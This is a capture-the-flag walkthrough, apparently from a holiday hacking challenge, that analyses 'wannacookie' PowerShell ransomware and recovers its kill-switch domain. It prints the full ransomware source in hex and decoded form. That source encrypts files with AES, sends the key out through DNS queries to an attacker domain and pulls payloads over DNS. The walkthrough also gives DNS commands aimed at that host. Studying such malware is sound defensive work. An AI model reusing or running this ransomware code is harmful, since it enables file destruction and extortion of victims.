# Stop the Malware

> Identify a way to stop the malware in its tracks!

1- Look at the source code of the malware, and you'll notice it will do 64 DNS queries of type TXT:

```vbscript
function H2A($a) {$o; $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}; return $o};
$f = "77616E6E61636F6F6B69652E6D696E2E707331";
$h = "";

upperLimit = ([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).strings, 10)-1)
foreach ($i in 0..upperLimit)  {
  $h += (Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).strings
};

decoded = $(H2A $h | Out-string)

Print decoded;

# iex(decoded)
```

After the `foreach` loop, the variable `$h` will contain the ASCII encoded source code of the actual malware.

2. Filter those packets in WireShark using the following filter:
` (dns.txt) && dns.qry.name contains "rburge.ru" && dns.qry.name matches "^[0-9]{1,2}\.77616E" `

Then export those packets as JSon using File - Export packet dissections - JSON.

3. Process those packets with Javascript or PHP or any other language to retrieve the DNS responses and concatenate them to end up with:

```2466756e6374696f6e73203d207b66756e6374696f6e20655f645f66696c6528246b65792c202446696c652c2024656e635f697429207b5b627974655b5d5d246b6579203d20246b65793b24537566666978203d2022602e77616e6e61636f6f6b6965223b5b53797374656d2e5265666c656374696f6e2e417373656d626c795d3a3a4c6f6164576974685061727469616c4e616d65282753797374656d2e53656375726974792e43727970746f67726170687927293b5b53797374656d2e496e7433325d244b657953697a65203d20246b65792e4c656e6774682a383b2441455350203d204e65772d4f626a656374202753797374656d2e53656375726974792e43727970746f6772617068792e4165734d616e61676564273b24414553502e4d6f6465203d205b53797374656d2e53656375726974792e43727970746f6772617068792e4369706865724d6f64655d3a3a4342433b24414553502e426c6f636b53697a65203d203132383b24414553502e4b657953697a65203d20244b657953697a653b24414553502e4b6579203d20246b65793b2446696c655352203d204e65772d4f626a6563742053797374656d2e494f2e46696c6553747265616d282446696c652c205b53797374656d2e494f2e46696c654d6f64655d3a3a4f70656e293b6966202824656e635f697429207b244465737446696c65203d202446696c65202b20245375666669787d20656c7365207b244465737446696c65203d20282446696c65202d7265706c6163652024537566666978297d3b2446696c655357203d204e65772d4f626a6563742053797374656d2e494f2e46696c6553747265616d28244465737446696c652c205b53797374656d2e494f2e46696c654d6f64655d3a3a437265617465293b6966202824656e635f697429207b24414553502e47656e6572617465495628293b2446696c6553572e5772697465285b53797374656d2e426974436f6e7665727465725d3a3a47657442797465732824414553502e49562e4c656e677468292c20302c2034293b2446696c6553572e57726974652824414553502e49562c20302c2024414553502e49562e4c656e677468293b245472616e73666f726d203d2024414553502e437265617465456e63727970746f7228297d20656c7365207b5b427974655b5d5d244c656e4956203d204e65772d4f626a65637420427974655b5d20343b2446696c6553522e5365656b28302c205b53797374656d2e494f2e5365656b4f726967696e5d3a3a426567696e29207c204f75742d4e756c6c3b2446696c6553522e5265616428244c656e49562c2020302c203329207c204f75742d4e756c6c3b5b496e745d244c4956203d205b53797374656d2e426974436f6e7665727465725d3a3a546f496e74333228244c656e49562c202030293b5b427974655b5d5d244956203d204e65772d4f626a65637420427974655b5d20244c49563b2446696c6553522e5365656b28342c205b53797374656d2e494f2e5365656b4f726967696e5d3a3a426567696e29207c204f75742d4e756c6c3b2446696c6553522e52656164282449562c20302c20244c495629207c204f75742d4e756c6c3b24414553502e4956203d202449563b245472616e73666f726d203d2024414553502e437265617465446563727970746f7228297d3b2443727970746f53203d204e65772d4f626a6563742053797374656d2e53656375726974792e43727970746f6772617068792e43727970746f53747265616d282446696c6553572c20245472616e73666f726d2c205b53797374656d2e53656375726974792e43727970746f6772617068792e43727970746f53747265616d4d6f64655d3a3a5772697465293b5b496e745d24436f756e74203d20303b5b496e745d24426c6f636b537a427473203d2024414553502e426c6f636b53697a65202f20383b5b427974655b5d5d2444617461203d204e65772d4f626a65637420427974655b5d2024426c6f636b537a4274733b446f207b24436f756e74203d202446696c6553522e526561642824446174612c20302c2024426c6f636b537a427473293b2443727970746f532e57726974652824446174612c20302c2024436f756e74297d205768696c65202824436f756e74202d67742030293b2443727970746f532e466c75736846696e616c426c6f636b28293b2443727970746f532e436c6f736528293b2446696c6553522e436c6f736528293b2446696c6553572e436c6f736528293b436c6561722d7661726961626c65202d4e616d6520226b6579223b52656d6f76652d4974656d202446696c657d7d3b66756e6374696f6e20483242207b706172616d28244858293b244858203d20244858202d73706c69742027282e2e2927207c203f207b20245f207d3b466f724561636820282476616c756520696e20244858297b5b436f6e766572745d3a3a546f496e743332282476616c75652c3136297d7d3b66756e6374696f6e2041324828297b506172616d282461293b2463203d2027273b2462203d2024612e546f43686172417272617928293b3b466f7265616368202824656c656d656e7420696e20246229207b2463203d202463202b20222022202b205b53797374656d2e537472696e675d3a3a466f726d617428227b303a587d222c205b53797374656d2e436f6e766572745d3a3a546f55496e7433322824656c656d656e7429297d3b72657475726e202463202d7265706c616365202720277d3b66756e6374696f6e204832412829207b506172616d282461293b246f7574613b2461202d73706c69742027282e2e2927207c203f207b20245f207d20207c20666f7245616368207b5b636861725d285b636f6e766572745d3a3a746f696e74313628245f2c313629297d207c20666f7245616368207b246f757461203d20246f757461202b20245f7d3b72657475726e20246f7574617d3b66756e6374696f6e20423248207b706172616d2824444543293b24746d70203d2027273b466f724561636820282476616c756520696e2024444543297b2461203d20227b303a787d22202d66205b496e745d2476616c75653b6966202824612e6c656e677468202d65712031297b24746d70202b3d20273027202b2024617d20656c7365207b24746d70202b3d2024617d7d3b72657475726e2024746d707d3b66756e6374696f6e2074695f726f78207b706172616d282462312c20246232293b246231203d20242848324220246231293b246232203d20242848324220246232293b24636f6e74203d204e65772d4f626a65637420427974655b5d202462312e636f756e743b696620282462312e636f756e74202d6571202462322e636f756e7429207b666f722824693d303b202469202d6c74202462312e636f756e74203b2024692b2b29207b24636f6e745b24695d203d202462315b24695d202d62786f72202462325b24695d7d7d3b72657475726e2024636f6e747d3b66756e6374696f6e20423247207b706172616d285b627974655b5d5d2444617461293b50726f63657373207b246f7574203d205b53797374656d2e494f2e4d656d6f727953747265616d5d3a3a6e657728293b246753747265616d203d204e65772d4f626a6563742053797374656d2e494f2e436f6d7072657373696f6e2e477a697053747265616d20246f75742c20285b494f2e436f6d7072657373696f6e2e436f6d7072657373696f6e4d6f64655d3a3a436f6d7072657373293b246753747265616d2e57726974652824446174612c20302c2024446174612e4c656e677468293b246753747265616d2e436c6f736528293b72657475726e20246f75742e546f417272617928297d7d3b66756e6374696f6e20473242207b706172616d285b627974655b5d5d2444617461293b50726f63657373207b2453726344617461203d204e65772d4f626a6563742053797374656d2e494f2e4d656d6f727953747265616d28202c20244461746120293b246f7574707574203d204e65772d4f626a6563742053797374656d2e494f2e4d656d6f727953747265616d3b246753747265616d203d204e65772d4f626a6563742053797374656d2e494f2e436f6d7072657373696f6e2e477a697053747265616d2024537263446174612c20285b494f2e436f6d7072657373696f6e2e436f6d7072657373696f6e4d6f64655d3a3a4465636f6d7072657373293b246753747265616d2e436f7079546f2820246f757470757420293b246753747265616d2e436c6f736528293b24537263446174612e436c6f736528293b5b627974655b5d5d202462797465417272203d20246f75747075742e546f417272617928293b72657475726e2024627974654172727d7d3b66756e6374696f6e20736831285b537472696e675d2024537472696e6729207b245342203d204e65772d4f626a6563742053797374656d2e546578742e537472696e674275696c6465723b5b53797374656d2e53656375726974792e43727970746f6772617068792e48617368416c676f726974686d5d3a3a43726561746528225348413122292e436f6d7075746548617368285b53797374656d2e546578742e456e636f64696e675d3a3a555446382e47657442797465732824537472696e6729297c257b5b566f69645d2453422e417070656e6428245f2e546f537472696e67282278322229297d3b2453422e546f537472696e6728297d3b66756e6374696f6e20705f6b5f6528246b65795f62797465732c205b627974655b5d5d247075625f6279746573297b2463657274203d204e65772d4f626a656374202d547970654e616d652053797374656d2e53656375726974792e43727970746f6772617068792e583530394365727469666963617465732e583530394365727469666963617465323b24636572742e496d706f727428247075625f6279746573293b24656e634b6579203d2024636572742e5075626c69634b65792e4b65792e456e637279707428246b65795f62797465732c202474727565293b72657475726e2024284232482024656e634b6579297d3b66756e6374696f6e20655f6e5f64207b706172616d28246b65792c2024616c6c66696c65732c20246d616b655f636f6f6b696520293b2474636f756e74203d2031323b666f722028202466696c653d303b202466696c65202d6c742024616c6c66696c65732e6c656e6774683b202466696c652b2b202029207b7768696c652028247472756529207b2472756e6e696e67203d2040284765742d4a6f62207c2057686572652d4f626a656374207b20245f2e5374617465202d6571202752756e6e696e6727207d293b696620282472756e6e696e672e436f756e74202d6c65202474636f756e7429207b53746172742d4a6f6220202d536372697074426c6f636b207b706172616d28246b65792c202446696c652c2024747275655f66616c7365293b7472797b655f645f66696c6520246b6579202446696c652024747275655f66616c73657d206361746368207b245f2e457863657074696f6e2e4d657373616765207c204f75742d537472696e67207c204f75742d46696c6520242824656e763a7573657270726f66696c652b275c4465736b746f705c70735f6c6f672e7478742729202d617070656e647d7d202d6172677320246b65792c2024616c6c66696c65735b2466696c655d2c20246d616b655f636f6f6b6965202d496e697469616c697a6174696f6e536372697074202466756e6374696f6e733b627265616b7d20656c7365207b53746172742d536c656570202d6d203230303b636f6e74696e75657d7d7d7d3b66756e6374696f6e20675f6f5f646e7328246629207b2468203d2027273b666f72656163682028246920696e20302e2e285b636f6e766572745d3a3a546f496e7433322824285265736f6c76652d446e734e616d65202d5365727665722065726f68657466616e752e636f6d202d4e616d65202224662e65726f68657466616e752e636f6d22202d5479706520545854292e537472696e67732c203130292d312929207b2468202b3d2024285265736f6c76652d446e734e616d65202d5365727665722065726f68657466616e752e636f6d202d4e616d65202224692e24662e65726f68657466616e752e636f6d22202d5479706520545854292e537472696e67737d3b72657475726e2028483241202468297d3b66756e6374696f6e20735f325f63282461737472696e672c202473697a653d333229207b246e65775f617272203d204028293b246368756e6b5f696e6465783d303b666f726561636828246920696e20312e2e24282461737472696e672e6c656e677468202f202473697a652929207b246e65775f617272202b3d2040282461737472696e672e737562737472696e6728246368756e6b5f696e6465782c2473697a6529293b246368756e6b5f696e646578202b3d202473697a657d3b72657475726e20246e65775f6172727d3b66756e6374696f6e20736e645f6b2824656e635f6b29207b246368756e6b73203d2028735f325f632024656e635f6b20293b666f72656163682028246a20696e20246368756e6b7329207b69662028246368756e6b732e496e6465784f6628246a29202d6571203029207b246e5f635f6964203d2024285265736f6c76652d446e734e616d65202d5365727665722065726f68657466616e752e636f6d202d4e616d652022246a2e364236353739363636463732363236463734363936342e65726f68657466616e752e636f6d22202d5479706520545854292e537472696e67737d20656c7365207b24285265736f6c76652d446e734e616d65202d5365727665722065726f68657466616e752e636f6d202d4e616d652022246e5f635f69642e246a2e364236353739363636463732363236463734363936342e65726f68657466616e752e636f6d22202d5479706520545854292e537472696e67737d7d3b72657475726e20246e5f635f69647d3b66756e6374696f6e2077616e63207b245331203d2022316638623038303030303030303030303034303039336537363736323132393736356532653165363634306636333631653765323032303030636464356335633130303030303030223b69662028246e756c6c202d6e652028285265736f6c76652d446e734e616d65202d4e616d6520242848324120242842324820242874695f726f78202428423248202428473242202428483242202453312929292024285265736f6c76652d446e734e616d65202d5365727665722065726f68657466616e752e636f6d202d4e616d652036423639364336433733373736393734363336382e65726f68657466616e752e636f6d202d5479706520545854292e537472696e67732929292e546f537472696e672829202d4572726f72416374696f6e2030202d53657276657220382e382e382e38292929207b72657475726e7d3b6966202824286e657473746174202d616e6f207c2053656c6563742d537472696e6720223132372e302e302e313a3830383022292e6c656e677468202d6e652030202d6f7220284765742d576d694f626a6563742057696e33325f436f6d707574657253797374656d292e446f6d61696e202d6e6520224b52494e474c45434153544c452229207b72657475726e7d3b24705f6b203d205b53797374656d2e436f6e766572745d3a3a46726f6d426173653634537472696e67282428675f6f5f646e73282237333635373237363635373232453633373237342229202920293b24625f6b203d20285b53797374656d2e546578742e456e636f64696e675d3a3a556e69636f64652e4765744279746573282428285b636861725b5d5d285b636861725d30312e2e5b636861725d32353529202b20285b636861725b5d5d285b636861725d30312e2e5b636861725d3235352929202b20302e2e39207c20736f7274207b4765742d52616e646f6d7d295b302e2e31355d202d6a6f696e202727292920207c203f207b245f202d6e6520307830307d293b24685f6b203d2024284232482024625f6b293b246b5f68203d2024287368312024685f6b293b24705f6b5f655f6b203d2028705f6b5f652024625f6b2024705f6b292e546f537472696e6728293b24635f6964203d2028736e645f6b2024705f6b5f655f6b293b24645f74203d20282824284765742d44617465292e546f556e6976657273616c54696d652829207c204f75742d537472696e6729202d7265706c61636520226072606e22293b5b61727261795d24665f63203d2024284765742d4368696c644974656d202a2e656c666462202d4578636c756465202a2e77616e6e61636f6f6b6965202d50617468202428242824656e763a7573657270726f66696c652b275c4465736b746f7027292c242824656e763a7573657270726f66696c652b275c446f63756d656e747327292c242824656e763a7573657270726f66696c652b275c566964656f7327292c242824656e763a7573657270726f66696c652b275c506963747572657327292c242824656e763a7573657270726f66696c652b275c4d75736963272929202d52656375727365207c207768657265207b202120245f2e50534973436f6e7461696e6572207d207c20466f72656163682d4f626a656374207b245f2e46756c6c6e616d657d293b655f6e5f642024625f6b2024665f632024747275653b436c6561722d7661726961626c65202d4e616d652022685f6b223b436c6561722d7661726961626c65202d4e616d652022625f6b223b246c75726c203d2027687474703a2f2f3132372e302e302e313a383038302f273b2468746d6c5f63203d20407b27474554202f2720203d20202428675f6f5f646e7320284132482022736f757263652e6d696e2e68746d6c2229293b27474554202f636c6f73652720203d2020273c703e427965213c2f703e277d3b53746172742d4a6f62202d536372697074426c6f636b7b706172616d282475726c293b53746172742d536c6565702031303b4164642d74797065202d417373656d626c794e616d652053797374656d2e57696e646f77732e466f726d733b73746172742d70726f6365737320222475726c22202d57696e646f775374796c65204d6178696d697a65643b53746172742d736c65657020323b5b53797374656d2e57696e646f77732e466f726d732e53656e644b6579735d3a3a53656e645761697428227b4631317d22297d202d41726720246c75726c3b246c697374203d204e65772d4f626a6563742053797374656d2e4e65742e487474704c697374656e65723b246c6973742e50726566697865732e41646428246c75726c293b246c6973742e537461727428293b747279207b24636c6f7365203d202466616c73653b7768696c652028246c6973742e49734c697374656e696e6729207b24636f6e74657874203d20246c6973742e476574436f6e7465787428293b24526571203d2024636f6e746578742e526571756573743b2452657370203d2024636f6e746578742e526573706f6e73653b247265637664203d20277b307d207b317d27202d6620245265712e687474706d6574686f642c20245265712e75726c2e6c6f63616c706174683b69662028247265637664202d65712027474554202f2729207b2468746d6c203d202468746d6c5f635b2472656376645d7d20656c736569662028247265637664202d65712027474554202f646563727970742729207b24616b6579203d20245265712e5175657279537472696e672e4974656d28226b657922293b69662028246b5f68202d65712024287368312024616b65792929207b24616b6579203d2024284832422024616b6579293b5b61727261795d24665f63203d2024284765742d4368696c644974656d202d5061746820242824656e763a7573657270726f66696c6529202d5265637572736520202d46696c746572202a2e77616e6e61636f6f6b6965207c207768657265207b202120245f2e50534973436f6e7461696e6572207d207c20466f72656163682d4f626a656374207b245f2e46756c6c6e616d657d293b655f6e5f642024616b65792024665f63202466616c73653b2468746d6c203d202246696c65732068617665206265656e2064656372797074656421223b24636c6f7365203d2024747275657d20656c7365207b2468746d6c203d2022496e76616c6964204b657921227d7d20656c736569662028247265637664202d65712027474554202f636c6f73652729207b24636c6f7365203d2024747275653b2468746d6c203d202468746d6c5f635b2472656376645d7d20656c736569662028247265637664202d65712027474554202f636f6f6b69655f69735f706169642729207b24635f6e5f6b203d2024285265736f6c76652d446e734e616d65202d5365727665722065726f68657466616e752e636f6d202d4e616d6520282224635f69642e3732363136653733366636643639373337303631363936342e65726f68657466616e752e636f6d222e7472696d282929202d5479706520545854292e537472696e67733b696620282024635f6e5f6b2e6c656e677468202d65712033322029207b2468746d6c203d2024635f6e5f6b7d20656c7365207b2468746d6c203d2022554e504149447c24635f69647c24645f74227d7d20656c7365207b24526573702e737461747573636f6465203d203430343b2468746d6c203d20273c68313e343034204e6f7420466f756e643c2f68313e277d3b24627566666572203d205b546578742e456e636f64696e675d3a3a555446382e4765744279746573282468746d6c293b24526573702e436f6e74656e744c656e6774683634203d20246275666665722e6c656e6774683b24526573702e4f757470757453747265616d2e577269746528246275666665722c20302c20246275666665722e6c656e677468293b24526573702e436c6f736528293b6966202824636c6f736529207b246c6973742e53746f7028293b72657475726e7d7d7d2066696e616c6c79207b246c6973742e53746f7028297d7d3b77616e633b0a
```

4. Decode that text using [the 02-extract-payload script](./../scripts/malware_analysis/02-extract-payload.js) and get:

```
$functions = {function e_d_file($key, $File, $enc_it) {[byte[]]$key = $key;$Suffix = "`.wannacookie";[System.Reflection.Assembly]::LoadWithPartialName('System.Security.Cryptography');[System.Int32]$KeySize = $key.Length*8;$AESP = New-Object 'System.Security.Cryptography.AesManaged';$AESP.Mode = [System.Security.Cryptography.CipherMode]::CBC;$AESP.BlockSize = 128;$AESP.KeySize = $KeySize;$AESP.Key = $key;$FileSR = New-Object System.IO.FileStream($File, [System.IO.FileMode]::Open);if ($enc_it) {$DestFile = $File + $Suffix} else {$DestFile = ($File -replace $Suffix)};$FileSW = New-Object System.IO.FileStream($DestFile, [System.IO.FileMode]::Create);if ($enc_it) {$AESP.GenerateIV();$FileSW.Write([System.BitConverter]::GetBytes($AESP.IV.Length), 0, 4);$FileSW.Write($AESP.IV, 0, $AESP.IV.Length);$Transform = $AESP.CreateEncryptor()} else {[Byte[]]$LenIV = New-Object Byte[] 4;$FileSR.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null;$FileSR.Read($LenIV,  0, 3) | Out-Null;[Int]$LIV = [System.BitConverter]::ToInt32($LenIV,  0);[Byte[]]$IV = New-Object Byte[] $LIV;$FileSR.Seek(4, [System.IO.SeekOrigin]::Begin) | Out-Null;$FileSR.Read($IV, 0, $LIV) | Out-Null;$AESP.IV = $IV;$Transform = $AESP.CreateDecryptor()};$CryptoS = New-Object System.Security.Cryptography.CryptoStream($FileSW, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write);[Int]$Count = 0;[Int]$BlockSzBts = $AESP.BlockSize / 8;[Byte[]]$Data = New-Object Byte[] $BlockSzBts;Do {$Count = $FileSR.Read($Data, 0, $BlockSzBts);$CryptoS.Write($Data, 0, $Count)} While ($Count -gt 0);$CryptoS.FlushFinalBlock();$CryptoS.Close();$FileSR.Close();$FileSW.Close();Clear-variable -Name "key";Remove-Item $File}};function H2B {param($HX);$HX = $HX -split '(..)' | ? { $_ };ForEach ($value in $HX){[Convert]::ToInt32($value,16)}};function A2H(){Param($a);$c = '';$b = $a.ToCharArray();;Foreach ($element in $b) {$c = $c + " " + [System.String]::Format("{0:X}", [System.Convert]::ToUInt32($element))};return $c -replace ' '};function H2A() {Param($a);$outa;$a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$outa = $outa + $_};return $outa};function B2H {param($DEC);$tmp = '';ForEach ($value in $DEC){$a = "{0:x}" -f [Int]$value;if ($a.length -eq 1){$tmp += '0' + $a} else {$tmp += $a}};return $tmp};function ti_rox {param($b1, $b2);$b1 = $(H2B $b1);$b2 = $(H2B $b2);$cont = New-Object Byte[] $b1.count;if ($b1.count -eq $b2.count) {for($i=0; $i -lt $b1.count ; $i++) {$cont[$i] = $b1[$i] -bxor $b2[$i]}};return $cont};function B2G {param([byte[]]$Data);Process {$out = [System.IO.MemoryStream]::new();$gStream = New-Object System.IO.Compression.GzipStream $out, ([IO.Compression.CompressionMode]::Compress);$gStream.Write($Data, 0, $Data.Length);$gStream.Close();return $out.ToArray()}};function G2B {param([byte[]]$Data);Process {$SrcData = New-Object System.IO.MemoryStream( , $Data );$output = New-Object System.IO.MemoryStream;$gStream = New-Object System.IO.Compression.GzipStream $SrcData, ([IO.Compression.CompressionMode]::Decompress);$gStream.CopyTo( $output );$gStream.Close();$SrcData.Close();[byte[]] $byteArr = $output.ToArray();return $byteArr}};function sh1([String] $String) {$SB = New-Object System.Text.StringBuilder;[System.Security.Cryptography.HashAlgorithm]::Create("SHA1").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($String))|%{[Void]$SB.Append($_.ToString("x2"))};$SB.ToString()};function p_k_e($key_bytes, [byte[]]$pub_bytes){$cert = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509Certificate2;$cert.Import($pub_bytes);$encKey = $cert.PublicKey.Key.Encrypt($key_bytes, $true);return $(B2H $encKey)};function e_n_d {param($key, $allfiles, $make_cookie );$tcount = 12;for ( $file=0; $file -lt $allfiles.length; $file++  ) {while ($true) {$running = @(Get-Job | Where-Object { $_.State -eq 'Running' });if ($running.Count -le $tcount) {Start-Job  -ScriptBlock {param($key, $File, $true_false);try{e_d_file $key $File $true_false} catch {$_.Exception.Message | Out-String | Out-File $($env:userprofile+'\Desktop\ps_log.txt') -append}} -args $key, $allfiles[$file], $make_cookie -InitializationScript $functions;break} else {Start-Sleep -m 200;continue}}}};function g_o_dns($f) {$h = '';foreach ($i in 0..([convert]::ToInt32($(Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).Strings, 10)-1)) {$h += $(Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).Strings};return (H2A $h)};function s_2_c($astring, $size=32) {$new_arr = @();$chunk_index=0;foreach($i in 1..$($astring.length / $size)) {$new_arr += @($astring.substring($chunk_index,$size));$chunk_index += $size};return $new_arr};function snd_k($enc_k) {$chunks = (s_2_c $enc_k );foreach ($j in $chunks) {if ($chunks.IndexOf($j) -eq 0) {$n_c_id = $(Resolve-DnsName -Server erohetfanu.com -Name "$j.6B6579666F72626F746964.erohetfanu.com" -Type TXT).Strings} else {$(Resolve-DnsName -Server erohetfanu.com -Name "$n_c_id.$j.6B6579666F72626F746964.erohetfanu.com" -Type TXT).Strings}};return $n_c_id};function wanc {$S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000";if ($null -ne ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) {return};if ($(netstat -ano | Select-String "127.0.0.1:8080").length -ne 0 -or (Get-WmiObject Win32_ComputerSystem).Domain -ne "KRINGLECASTLE") {return};$p_k = [System.Convert]::FromBase64String($(g_o_dns("7365727665722E637274") ) );$b_k = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort {Get-Random})[0..15] -join ''))  | ? {$_ -ne 0x00});$h_k = $(B2H $b_k);$k_h = $(sh1 $h_k);$p_k_e_k = (p_k_e $b_k $p_k).ToString();$c_id = (snd_k $p_k_e_k);$d_t = (($(Get-Date).ToUniversalTime() | Out-String) -replace "`r`n");[array]$f_c = $(Get-ChildItem *.elfdb -Exclude *.wannacookie -Path $($($env:userprofile+'\Desktop'),$($env:userprofile+'\Documents'),$($env:userprofile+'\Videos'),$($env:userprofile+'\Pictures'),$($env:userprofile+'\Music')) -Recurse | where { ! $_.PSIsContainer } | Foreach-Object {$_.Fullname});e_n_d $b_k $f_c $true;Clear-variable -Name "h_k";Clear-variable -Name "b_k";$lurl = 'http://127.0.0.1:8080/';$html_c = @{'GET /'  =  $(g_o_dns (A2H "source.min.html"));'GET /close'  =  '<p>Bye!</p>'};Start-Job -ScriptBlock{param($url);Start-Sleep 10;Add-type -AssemblyName System.Windows.Forms;start-process "$url" -WindowStyle Maximized;Start-sleep 2;[System.Windows.Forms.SendKeys]::SendWait("{F11}")} -Arg $lurl;$list = New-Object System.Net.HttpListener;$list.Prefixes.Add($lurl);$list.Start();try {$close = $false;while ($list.IsListening) {$context = $list.GetContext();$Req = $context.Request;$Resp = $context.Response;$recvd = '{0} {1}' -f $Req.httpmethod, $Req.url.localpath;if ($recvd -eq 'GET /') {$html = $html_c[$recvd]} elseif ($recvd -eq 'GET /decrypt') {$akey = $Req.QueryString.Item("key");if ($k_h -eq $(sh1 $akey)) {$akey = $(H2B $akey);[array]$f_c = $(Get-ChildItem -Path $($env:userprofile) -Recurse  -Filter *.wannacookie | where { ! $_.PSIsContainer } | Foreach-Object {$_.Fullname});e_n_d $akey $f_c $false;$html = "Files have been decrypted!";$close = $true} else {$html = "Invalid Key!"}} elseif ($recvd -eq 'GET /close') {$close = $true;$html = $html_c[$recvd]} elseif ($recvd -eq 'GET /cookie_is_paid') {$c_n_k = $(Resolve-DnsName -Server erohetfanu.com -Name ("$c_id.72616e736f6d697370616964.erohetfanu.com".trim()) -Type TXT).Strings;if ( $c_n_k.length -eq 32 ) {$html = $c_n_k} else {$html = "UNPAID|$c_id|$d_t"}} else {$Resp.statuscode = 404;$html = '<h1>404 Not Found</h1>'};$buffer = [Text.Encoding]::UTF8.GetBytes($html);$Resp.ContentLength64 = $buffer.length;$Resp.OutputStream.Write($buffer, 0, $buffer.length);$Resp.Close();if ($close) {$list.Stop();return}}} finally {$list.Stop()}};wanc;
```

5. There is a function `wanc`, called at the end of the file, which has this snippet on it's declaration:
```
  $S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000";
  if ($null -ne 
  ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) {
      return
  }

```

Which deobfuscated will read like this:
```javascript
    $S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000";
    $asInt = $(H2B $S1);
    $uncompressedGZip = $(G2B $asInt);
    $encryptedData = $(B2H $uncompressedGZip)
    $decryptionKey = $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings;

    $domainNameToRegister = $(H2A $(B2H $(ti_rox $encryptedData $decryptionKey))).ToString();
    $nullOrNot = ((Resolve-DnsName -Name $domainNameToRegister -ErrorAction 0 -Server 8.8.8.8))
                        

  if ($null -ne $nullOrNot) {
      return
  }
  


```

Therefore `(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1)))` will return the encrypted domain name that needs to exist in order to stop the malware (the so called kill-switch domain)


6. What do these functions do?

`H2B`: Hexa to Binary; Will convert from hexa to Int32 ; each pair of characters is read as a single value.
`G2B`: Gzip to Binary; Will decompress Gzip format
`B2H`: Binary to Hexa, Will receive an array of decimal values and will return their hexa representation for each value.
`ti_rox`: Seems to receive 2 parameters and do a XOR; so probably decrypting values. It's actually `xor_it`
`H2A`: Hexa to Ascii. Will convert from Hexa to Ascii.


7. There's a way to retrieve the non-minified version of `wannacookie.ps1` but no need to; get the decryption key by running:
```bash
dig 6B696C6C737769746368.erohetfanu.com @erohetfanu.com +noedns TXT +short
"66667272727869657268667865666B73"
```

The encryption key is `66667272727869657268667865666B73`


8. Decrypt the kill-switch domain name by running all this in PowerShell:


```javascript

  function H2B {
    param($HX);
    $HX = $HX -split '(..)' | ? { $_ };
    ForEach ($value in $HX){[Convert]::ToInt32($value,16)}
  };

  function G2B {
    param([byte[]]$Data);
    Process {
      $SrcData = New-Object System.IO.MemoryStream( , $Data );
      $output = New-Object System.IO.MemoryStream;
      $gStream = New-Object System.IO.Compression.GzipStream $SrcData, ([IO.Compression.CompressionMode]::Decompress);
      $gStream.CopyTo( $output );
      $gStream.Close();
      $SrcData.Close();
      [byte[]] $byteArr = $output.ToArray();
      return $byteArr
    }
  };

  function B2H {
      param($DEC);
      $tmp = '';
      ForEach ($value in $DEC){
          $a = "{0:x}" -f [Int]$value;     ## Format the decimal value as hexa.
          if ($a.length -eq 1){
              $tmp += '0' + $a
          } else {
              $tmp += $a
          }
      };
      return $tmp
  };
    

      function ti_rox {
        param($b1, $b2);
        $b1 = $(H2B $b1);
        $b2 = $(H2B $b2);
        $cont = New-Object Byte[] $b1.count;
        if ($b1.count -eq $b2.count) {
          for($i=0; $i -lt $b1.count ; $i++) {
            $cont[$i] = $b1[$i] -bxor $b2[$i]}
        }
        ;return $cont
      };

      function H2A() {
          Param($a);
          $outa;
          $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$outa = $outa + $_};
          return $outa
      };

    $ENCRYPTION_KEY_GOES_HERE = "66667272727869657268667865666B73";
    $S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000";
    echo $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $ENCRYPTION_KEY_GOES_HERE)))

```

9. The domain to register happens to be `yippeekiyaa.aaay`
